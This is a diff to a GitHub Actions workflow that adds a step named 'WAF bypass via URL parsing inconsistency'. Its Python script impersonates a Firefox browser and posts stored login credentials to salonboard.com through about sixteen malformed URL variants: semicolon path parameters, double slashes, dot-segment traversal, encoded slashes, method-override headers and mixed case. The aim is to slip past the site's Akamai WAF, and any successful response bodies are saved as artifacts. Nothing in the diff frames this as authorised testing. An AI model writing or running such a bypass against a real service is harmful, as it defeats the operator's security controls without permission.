@@ -357,6 +357,117 @@ jobs:
           SALON_BOARD_ID: ${{ secrets.SALON_BOARD_ID }}
           SALON_BOARD_PASSWORD: ${{ secrets.SALON_BOARD_PASSWORD }}
 
+      - name: '[9] FINAL: WAF bypass via URL parsing inconsistency'
+        env:
+          SALON_BOARD_ID: ${{ secrets.SALON_BOARD_ID }}
+          SALON_BOARD_PASSWORD: ${{ secrets.SALON_BOARD_PASSWORD }}
+        run: |
+          # WAF (Akamai) and the application server (Java/Tomcat) normalize
+          # URLs differently. We exploit those differences so:
+          #   Akamai sees: "doesn't match POST /CNC/login/doLogin/* rule" → allow
+          #   Tomcat sees: same /CNC/login/doLogin/ endpoint → process login
+          python3 << 'PYEOF'
+          from curl_cffi import requests
+          import os
+
+          uid = os.environ["SALON_BOARD_ID"]
+          pw = os.environ["SALON_BOARD_PASSWORD"]
+
+          session = requests.Session()
+          print("--- Seed cookies via GET /login/ ---")
+          try:
+              session.get("https://salonboard.com/login/",
+                          impersonate="firefox133",
+                          headers={"Accept-Language": "ja-JP,ja;q=0.9"},
+                          timeout=15)
+          except Exception as e:
+              print(f"  ❌ Seed failed: {e}")
+              import sys; sys.exit(0)
+
+          # WAF bypass URL variations + headers
+          # Each tuple is (url, extra_headers, description)
+          tests = [
+              # Java jsessionid path parameter (most common Akamai bypass)
+              ("https://salonboard.com/CNC/login/doLogin;jsessionid=ABCDEF", {},
+               "Java jsessionid path param"),
+              # Just trailing semicolon
+              ("https://salonboard.com/CNC/login/doLogin;", {},
+               "Trailing semicolon"),
+              # Semicolon with extra path matter
+              ("https://salonboard.com/CNC/login/doLogin/;xyz=123", {},
+               "Trailing /;param"),
+              # Java action extensions
+              ("https://salonboard.com/CNC/login/doLogin.do", {},
+               "Java .do extension"),
+              ("https://salonboard.com/CNC/login/doLogin.action", {},
+               "Java .action extension"),
+              # Double slashes
+              ("https://salonboard.com/CNC//login/doLogin/", {},
+               "Double slash after /CNC/"),
+              ("https://salonboard.com//CNC/login/doLogin/", {},
+               "Leading double slash"),
+              ("https://salonboard.com/CNC/login//doLogin/", {},
+               "Double slash inside path"),
+              ("https://salonboard.com/CNC/login/doLogin//", {},
+               "Trailing double slash"),
+              # Path traversal that normalizes back
+              ("https://salonboard.com/CNC/login/foo/../doLogin/", {},
+               "Path traversal /foo/../"),
+              ("https://salonboard.com/CNC/./login/./doLogin/", {},
+               "Path /./ /./ normalization"),
+              # URL-encoded slash (%2F)
+              ("https://salonboard.com/CNC/login%2FdoLogin/", {},
+               "URL-encoded slash %2F"),
+              ("https://salonboard.com/CNC%2Flogin%2FdoLogin%2F", {},
+               "All slashes URL-encoded"),
+              # HTTP method override (POST with X-HTTP-Method)
+              ("https://salonboard.com/CNC/login/doLogin/",
+               {"X-HTTP-Method-Override": "POST", "X-Method-Override": "POST"},
+               "POST + method override headers (sanity)"),
+              # Suffix extra path
+              ("https://salonboard.com/CNC/login/doLogin/index.html", {},
+               "Extra /index.html suffix"),
+              # Mixed case (Java is usually case-sensitive but Akamai may be too)
+              ("https://salonboard.com/CNC/Login/DoLogin/", {},
+               "Mixed case Login/DoLogin"),
+          ]
+
+          for url, extra_headers, desc in tests:
+              hdrs = {
+                  "Origin": "https://salonboard.com",
+                  "Referer": "https://salonboard.com/login/",
+                  "Accept-Language": "ja-JP,ja;q=0.9",
+                  "Content-Type": "application/x-www-form-urlencoded",
+              }
+              hdrs.update(extra_headers)
+              try:
+                  r = session.post(
+                      url, impersonate="firefox133",
+                      data={"userId": uid, "password": pw},
+                      headers=hdrs, timeout=10, allow_redirects=False,
+                  )
+                  loc = r.headers.get("Location") or r.headers.get("location") or ""
+                  sc = r.headers.get("Set-Cookie", "")
+                  jsess = "JSESSIONID" in sc
+                  flag = "  "
+                  if 300 <= r.status_code < 400 and "login" not in loc.lower():
+                      flag = "🎉"
+                  elif r.status_code == 200 and jsess:
+                      flag = "✨"
+                  elif r.status_code != 200 and r.status_code != 404:
+                      flag = "❓"
+                  print(f"  {flag} {desc:45s} → HTTP {r.status_code:3d}, "
+                        f"body={len(r.text):5d}b, loc={loc[:50]!r}, JSESS={'Y' if jsess else 'N'}")
+                  # If success, save the body
+                  if flag in ("🎉", "✨"):
+                      fname = f"bypass_success_{desc[:20].replace('/', '_').replace(' ', '_')}.html"
+                      with open(fname, "w") as f:
+                          f.write(r.text)
+                      print(f"      Saved success body to {fname}")
+              except Exception as e:
+                  print(f"  ❌ {desc:45s} → {type(e).__name__}")
+          PYEOF
+
       - name: Upload discovery artifacts
         if: always()
         uses: actions/upload-artifact@v4
@@ -367,4 +478,5 @@ jobs:
             ats_login.html
             doLogin_no_slash.html
             posted_*.html
+            bypass_success_*.html
           if-no-files-found: ignore
